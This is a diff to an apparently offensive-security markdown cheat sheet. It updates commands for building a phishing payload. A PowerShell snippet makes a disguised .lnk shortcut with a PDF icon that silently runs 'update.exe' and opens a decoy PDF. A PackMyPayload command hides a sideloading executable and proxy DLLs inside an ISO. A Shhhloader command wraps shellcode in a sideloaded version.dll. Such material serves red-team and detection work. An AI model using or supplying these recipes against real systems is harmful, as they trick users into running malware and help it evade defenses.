@@ -351,19 +351,19 @@ NTSTATUS(NTAPI* ZwClose)(_In_ HANDLE Handle);
 Create a malicious link (also [here](https://gist.github.com/mttaggart/eb2ba020b8816cfe3da4cfd835240b7d)):
 
 ```powershell
-$obj = New-object -comobject wscript.shell
-$link = $obj.createshortcut("C:\out\clickme.lnk")
+$obj = New-object -ComObject wscript.shell
+$link = $obj.createshortcut("C:\Tools\PackMyPayload\out\clickme.lnk")
 $link.windowstyle = "7"
 $link.targetpath = "%windir%/system32/cmd.exe"
-$link.iconlocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
-$link.arguments = "/c start OneDriveStandaloneUpdater.exe"
+$link.iconlocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13" # PDF ico
+$link.arguments = "/c start update.exe & ""%ProgramFiles(x86)%/Microsoft/Edge/Application/msedge.exe"" %cd%/fake.pdf"
 $link.save()
 ```
 
 Pack all the files into an ISO with [PackMyPayload](https://github.com/mgeeky/PackMyPayload):
 
 ```
-PS > python .\PackMyPayload.py C:\out\ C:\out\mountme.iso --out-format iso --hide OneDrive.Update,OneDriveStandaloneUpdater.exe,version.dll,vresion.dll
+PS > python .\PackMyPayload.py .\out\ .\out\a.iso --out-format iso --hide OneDriveStandaloneUpdater.exe,vresion.dll,version.dll,fake.pdf
 ```
 
 
@@ -380,5 +380,5 @@ PS > python .\PackMyPayload.py C:\out\ C:\out\mountme.iso --out-format iso --hid
 - [https://github.com/icyguider/Shhhloader](https://github.com/icyguider/Shhhloader)
 
 ```
-$ ./Shhhloader.py -d -dp vresion.dll -o version.dll shellcode.bin
+$ ./Shhhloader.py -p RuntimeBroker.exe -d -dp vresion.dll -o version.dll shellcode.bin
 ```
